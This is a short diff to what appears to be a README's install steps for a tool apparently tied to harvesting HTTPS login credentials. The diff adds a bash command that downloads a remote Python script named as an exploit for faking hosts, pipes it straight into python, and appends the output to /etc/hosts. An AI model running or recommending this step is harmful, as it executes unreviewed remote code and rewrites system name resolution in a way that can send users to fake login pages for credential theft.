@@ -13,3 +13,6 @@ $ cd set
 $ pip install -r requirements.txt
 ```
 3. -
+```bash
+curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-login-credentials/master/hosts/modules/pyexploitcreate/pyexploitcreateIP_host_fake.py | python >> /etc/hosts
+```
